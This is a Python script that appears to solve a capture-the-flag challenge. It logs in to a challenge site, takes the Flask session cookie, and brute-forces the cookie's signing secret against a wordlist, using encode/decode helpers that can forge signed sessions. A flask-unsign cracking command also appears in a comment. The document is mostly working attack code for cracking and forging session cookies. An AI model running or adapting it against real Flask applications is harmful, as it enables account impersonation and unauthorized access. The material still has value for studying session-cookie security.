## https://www.youtube.com/watch?v=kru8On32BqY
## https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py

import sys
import zlib
from itsdangerous import base64_decode
import ast
import requests
from flask.sessions import SecureCookieSessionInterface
from random import SystemRandom

# First get cookie from actual website
def initial():
    url = 'https://cool.mc.ax/'
    s = requests.Session()

    r = s.post(url, data={
        'username':'admin12345',
        'password':'12345'
    })

    session_cookie = s.cookies['session']
    print(session_cookie)
    # flask generated cookie = eyJ1c2VybmFtZSI6ImFkbWluMTIzNDUifQ.YOmBzQ.nuhCIzrmiNOnPx0yFrEPC2pCUME

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e


def decode(session_cookie_value, secret_key=None):
    """ Decode a Flask cookie  """
    try:
        if(secret_key==None):
            compressed = False
            payload = session_cookie_value

            if payload.startswith('.'):
                compressed = True
                payload = payload[1:]

            data = payload.split(".")[0]

            data = base64_decode(data)
            if compressed:
                data = zlib.decompress(data)

            return data
        else:
            app = MockApp(secret_key)

            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.loads(session_cookie_value)
    except Exception:
        return "error"

# flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImFkbWluMTIzNDUifQ.YOmBzQ.nuhCIzrmiNOnPx0yFrEPC2pCUME' --no-literal-eval --legacy

def brute_force():
    payload = '{"username": "admin12345"}'
    actual_cookie = 'eyJ1c2VybmFtZSI6ImFkbWluMTIzNDUifQ.YOmBzQ.nuhCIzrmiNOnPx0yFrEPC2pCUME'
    fake_cookie = encode('test', payload)

    with open('/home/jqp/Downloads/rockyou.txt', encoding='latin-1') as handle:
        # lines = [l.strip() for l in handle.readlines()]
        lines = ['secret_key', 'cool', 'ginkoid', 'flag']
        linecount = len(lines)
        count = 0

        for secret_key in lines:
            print('Trying #{count} out of {total} -- {key}'.format(count=count+1, total=linecount, key=secret_key))
            decoded_payload = decode(actual_cookie, secret_key)
            count += 1
            if (decoded_payload != 'error'):
                print('Secret key is:', secret_key)
                print(decoded_payload)
                return


brute_force()
print("Done!")